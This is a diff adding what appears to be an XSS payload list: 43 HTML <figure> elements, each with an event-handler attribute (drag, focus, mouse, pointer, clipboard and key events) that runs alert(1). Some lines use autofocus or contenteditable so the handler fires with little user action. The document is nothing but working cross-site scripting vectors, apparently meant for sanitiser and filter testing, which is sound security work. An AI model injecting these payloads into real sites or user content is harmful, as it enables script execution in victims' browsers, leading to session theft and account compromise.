@@ -1,0 +1,43 @@
+<figure draggable="true" ondrag="alert(1)">test</figure>
+<figure draggable="true" ondragend="alert(1)">test</figure>
+<figure draggable="true" ondragenter="alert(1)">test</figure>
+<figure draggable="true" ondragleave="alert(1)">test</figure>
+<figure draggable="true" ondragstart="alert(1)">test</figure>
+<figure id=x tabindex=1 onactivate=alert(1)></figure>
+<figure id=x tabindex=1 onbeforeactivate=alert(1)></figure>
+<figure id=x tabindex=1 onbeforedeactivate=alert(1)></figure><input autofocus>
+<figure id=x tabindex=1 ondeactivate=alert(1)></figure><input id=y autofocus>
+<figure id=x tabindex=1 onfocus=alert(1)></figure>
+<figure id=x tabindex=1 onfocusin=alert(1)></figure>
+<figure onafterscriptexecute=alert(1)><script>1</script>
+<figure onbeforecopy="alert(1)" contenteditable>test</figure>
+<figure onbeforecut="alert(1)" contenteditable>test</figure>
+<figure onbeforepaste="alert(1)" contenteditable>test</figure>
+<figure onbeforescriptexecute=alert(1)><script>1</script>
+<figure onblur=alert(1) tabindex=1 id=x></figure><input autofocus>
+<figure onclick="alert(1)">test</figure>
+<figure oncontextmenu="alert(1)">test</figure>
+<figure oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<figure oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<figure ondblclick="alert(1)" autofocus tabindex=1>test</figure>
+<figure onfocusout=alert(1) tabindex=1 id=x></figure><input autofocus>
+<figure onkeydown="alert(1)" contenteditable>test</figure>
+<figure onkeypress="alert(1)" contenteditable>test</figure>
+<figure onkeyup="alert(1)" contenteditable>test</figure>
+<figure onmousedown="alert(1)">test</figure>
+<figure onmouseenter="alert(1)">test</figure>
+<figure onmouseleave="alert(1)">test</figure>
+<figure onmousemove="alert(1)">test</figure>
+<figure onmouseout="alert(1)">test</figure>
+<figure onmouseover="alert(1)">test</figure>
+<figure onmouseup="alert(1)">test</figure>
+<figure onmousewheel=alert(1)>requires scrolling
+<figure onpaste="alert(1)" contenteditable>test</figure>
+<figure onpointerdown=alert(1)>XSS</figure>
+<figure onpointerenter=alert(1)>XSS</figure>
+<figure onpointerleave=alert(1)>XSS</figure>
+<figure onpointermove=alert(1)>XSS</figure>
+<figure onpointerout=alert(1)>XSS</figure>
+<figure onpointerover=alert(1)>XSS</figure>
+<figure onpointerrawupdate=alert(1)>XSS</figure>
+<figure onpointerup=alert(1)>XSS</figure>
